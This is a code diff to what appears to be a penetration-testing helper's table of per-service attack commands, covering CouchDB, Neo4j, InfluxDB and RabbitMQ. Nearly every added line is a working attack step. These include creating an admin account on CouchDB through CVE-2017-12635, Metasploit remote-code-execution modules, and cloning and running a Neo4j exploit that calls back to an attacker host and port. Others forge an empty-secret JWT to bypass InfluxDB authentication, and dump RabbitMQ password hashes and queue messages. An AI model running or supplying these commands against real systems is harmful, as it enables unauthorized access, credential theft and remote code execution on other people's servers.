@@ -4459,12 +4459,17 @@ _STEP_COMMANDS = {
         1: [
             "curl -sk http://<RHOST>:5984/_all_dbs",
             "curl -sk http://<RHOST>:5984/",
+            "curl -sk 'http://<RHOST>:5984/<DB>/_all_docs?include_docs=true'",
+            "nmap -sV -p5984 --script couchdb-databases,couchdb-stats <RHOST>",
+            "msfconsole -q -x 'use auxiliary/scanner/couchdb/couchdb_enum; set RHOSTS <RHOST>; run; exit'",
         ],
         2: [
-            "curl -sk -X PUT 'http://<RHOST>:5984/_users/org.couchdb.user:pwn' -d '{\"type\":\"user\",\"name\":\"pwn\",\"roles\":[\"_admin\"],\"password\":\"pwn\"}' -H 'Content-Type: application/json'  # CVE-2017-12635",
+            "curl -sk -X PUT 'http://<RHOST>:5984/_users/org.couchdb.user:pwn' -H 'Content-Type: application/json' -d '{\"type\":\"user\",\"name\":\"pwn\",\"password\":\"pwn\",\"roles\":[\"_admin\"],\"roles\":[]}'  # CVE-2017-12635 (duplicate roles key)",
+            "curl -sk http://<RHOST>:5984/_all_dbs -u pwn:pwn   # confirm admin",
         ],
         3: [
             "# CVE-2017-12636: set query_server to a shell command, then trigger a view → RCE",
+            "msfconsole -q -x 'use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS <RHOST>; set RPORT 5984; run'",
             "searchsploit couchdb",
         ],
         4: [
@@ -4477,12 +4482,16 @@ _STEP_COMMANDS = {
     "neo4j": {
         1: [
             "curl -sk http://<RHOST>:7474/",
+            "curl -sk -u neo4j:neo4j http://<RHOST>:7474/db/data/",
             "cypher-shell -a bolt://<RHOST>:7687 -u neo4j -p neo4j",
         ],
         2: [
             "cypher-shell -a bolt://<RHOST>:7687 -u <USER> -p <PASS> 'MATCH (n) RETURN n LIMIT 25;'",
+            "cypher-shell -a bolt://<RHOST>:7687 -u <USER> -p <PASS> 'CALL db.labels(); CALL db.relationshipTypes();'",
+            "cypher-shell -a bolt://<RHOST>:7687 -u <USER> -p <PASS> 'MATCH (n) RETURN n;'",
         ],
         3: [
+            "git clone https://github.com/tavgar/CVE-2021-34371 && python3 CVE-2021-34371/exploit.py <RHOST> <LHOST> <LPORT>",
             "searchsploit neo4j",
             "# APOC RCE: CALL apoc.load.jsonParams / dbms.security functions on vulnerable builds",
         ],
@@ -4492,10 +4501,13 @@ _STEP_COMMANDS = {
     },
     "influxdb": {
         1: [
-            "python3 influxdb_exploit.py <RHOST> 8086   # CVE-2019-20933 auth bypass",
+            "git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 && python3 InfluxDB-Exploit-CVE-2019-20933   # interactive: host, port 8086, user admin -> InfluxQL shell",
+            "# JWT: jwt.io HS256 with empty secret, payload {\"username\":\"admin\",\"exp\":<future>}",
         ],
         2: [
             "curl -sk 'http://<RHOST>:8086/query?q=SHOW+DATABASES'",
+            "curl -sk -H 'Authorization: Bearer <JWT>' 'http://<RHOST>:8086/query?q=SHOW+DATABASES'",
+            "curl -sk 'http://<RHOST>:8086/query?db=<DB>&q=SHOW+MEASUREMENTS'",
             "curl -sk 'http://<RHOST>:8086/query?db=<DB>&q=SELECT+*+FROM+/.*/+LIMIT+50'",
         ],
         3: [
@@ -4512,9 +4524,12 @@ _STEP_COMMANDS = {
         ],
         2: [
             "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/overview",
+            "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/definitions   # users+hashes, vhosts, perms, queues — everything",
+            "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/users | jq '.[]|{name,password_hash,tags}'",
         ],
         3: [
             "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/queues | jq '.[].name'",
+            "curl -sk -u <USER>:<PASS> -X POST http://<RHOST>:15672/api/queues/%2F/<QUEUE>/get -H 'content-type: application/json' -d '{\"count\":10,\"ackmode\":\"ack_requeue_true\",\"encoding\":\"auto\"}'",
         ],
         4: [
             "# Erlang cookie (with epmd 4369) → RabbitMQ node RCE",
